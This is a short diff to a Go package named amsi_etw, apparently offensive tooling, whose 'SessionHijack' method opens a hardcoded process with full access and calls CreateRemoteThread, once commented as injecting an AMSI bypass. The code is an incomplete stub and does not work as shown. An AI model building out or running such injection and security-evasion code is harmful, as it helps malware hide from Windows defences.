@@ -1,7 +1,9 @@
+//go:build windows
+
 package amsi_etw
 
 import (
-"syscall"
+"golang.org/x/sys/windows"
 "unsafe"
 )
 
@@ -12,15 +14,13 @@ return &SessionHijack{}
 }
 
 func (s *SessionHijack) Hijack() error {
-kernel32 := syscall.NewLazyDLL("kernel32.dll")
+kernel32 := windows.NewLazyDLL("kernel32.dll")
 procOpenProcess := kernel32.NewProc("OpenProcess")
 procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
 
-pid := uint32(1234) // Target process ID
+pid := uint32(1234)
 handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))
 
-// Allocate memory in target process and inject AMSI bypass
 procCreateRemoteThread.Call(handle, 0, 0, 0, 0, 0, 0)
-
 return nil
 }
